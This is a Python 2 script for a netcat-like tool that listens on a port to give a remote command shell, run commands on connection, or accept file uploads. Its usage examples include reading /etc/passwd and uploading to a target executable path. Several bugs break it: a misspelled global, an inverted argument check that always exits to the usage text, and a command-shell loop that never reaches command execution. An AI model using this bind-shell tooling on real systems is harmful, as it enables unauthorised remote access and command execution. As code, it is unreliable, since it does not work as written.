import sys
import socket
import getopt
import threading
import subprocess

# Global variables
listen = False
commans = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print "Net Tool"
    print
    print "Usage: %s -t target_host -P target_port" % sys.argv[0]
    print "-l --listen                  - listen on [host]:[port] for" \
          "                               incoming connections"
    print "-e --execute=file_to_run     - execute the given file upon" \
          "                               receiving a connection"
    print "-c --command                 - initialize a command shell"
    print "-u --upload=destination      - upon receiving connection upload a" \
          "                               file and write to [destination]"
    print
    print
    print "Examples: "
    print "%s -t 192.168.0.1 -p 5555 -l -c" % sys.argv[0]
    print "%s -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe" % sys.argv[0]
    print "%s -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"" % sys.argv[0]
    sys.exit(0)


def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            # wait for more input
            buffer = raw_input("")
            buffer += "\n"

            client.send(buffer)
    except:
        print "[-] ERROR on sending"
        client.close()


def server_loop():
    global target

    # if no target is defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Successfully save file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    if len(execute):

        output = run_command(execute)

        client_socket.send(output)

    if command:

        while True:
            client_socket.send("> ")

        cmd_buffer = ""
        while "\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024)

        response = run_command(cmd_buffer)

        client_socket.send(response)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if len(sys.argv) > 1:
        usage()

    # read commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # just send data from stdin, no listen
    if not listen and len(target) and port > 0:

        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)

    # listen and (may) upload things, execute commands, drop a shell back
    if listen:
        server_loop()


if __name__ == '__main__':
    main()
 
